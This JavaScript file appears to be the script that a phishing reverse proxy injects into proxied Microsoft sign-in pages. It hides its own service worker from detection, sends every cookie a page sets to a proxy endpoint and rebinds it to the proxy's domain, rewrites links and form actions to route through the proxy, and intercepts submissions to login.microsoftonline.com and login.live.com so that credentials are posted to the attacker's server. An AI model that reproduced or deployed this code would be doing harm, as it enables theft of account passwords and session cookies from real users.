(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;

    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;

    navigator.serviceWorker.getRegistrations = function () {
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {
                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");

    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);

                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {
                    let attribute = cookieAttribute.trim();
                    if (attribute) {
                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
                        if (cookieDomainMatch) {
                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = `Domain=${self.location.hostname}`;
                            }
                        }
                        modifiedCookie += `${attribute}; `;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
            }
        }
    });
})();

const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        }
        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];

observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    }
    catch { }
}

function scanAndUpdateAttributes() {
    const allElements = document.querySelectorAll('*');
    for (const el of allElements) {
        for (const attr of attributes) {
            if (el.hasAttribute(attr)) {
                updateHTMLAttribute(el, attr);
            }
        }
    }
}

// Run initial scan on DOM ready and again after a short delay
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        scanAndUpdateAttributes();
        setTimeout(scanAndUpdateAttributes, 100);
    });
} else {
    scanAndUpdateAttributes();
    setTimeout(scanAndUpdateAttributes, 100);
}

// === DIRECT FORM SUBMIT INTERCEPT (MOST RELIABLE) ===
function interceptFormSubmit() {
    const forms = document.querySelectorAll('form');
    for (const form of forms) {
        // Only intercept forms that post to Microsoft (or any external domain)
        const action = form.getAttribute('action') || '';
        if (action.includes('login.microsoftonline.com') || action.includes('login.live.com')) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const formData = new FormData(form);
                // Convert to URL-encoded string
                const params = new URLSearchParams(formData).toString();
                const proxyPath = '/lNv1pC9AWPUY4gbidyBO';
                const proxyUrl = new URL(proxyPath, self.location.origin);
                // Pass the original action as a parameter
                const originalAction = form.action || window.location.href;
                proxyUrl.searchParams.set('url', originalAction);

                fetch(proxyUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: params,
                    credentials: 'include'
                })
                .then(response => {
                    if (response.redirected) {
                        window.location.href = response.url;
                    } else {
                        response.text().then(html => {
                            document.open();
                            document.write(html);
                            document.close();
                        });
                    }
                })
                .catch(err => console.error('Proxy submission error:', err));
            });
        }
    }
}

// Run form interceptor after DOM ready and again after dynamic changes
function runInterceptor() {
    interceptFormSubmit();
    // Also re-run when new forms are added (MutationObserver already handles attribute changes, but not new forms)
    const formObserver = new MutationObserver(() => {
        interceptFormSubmit();
    });
    formObserver.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', runInterceptor);
} else {
    runInterceptor();
}
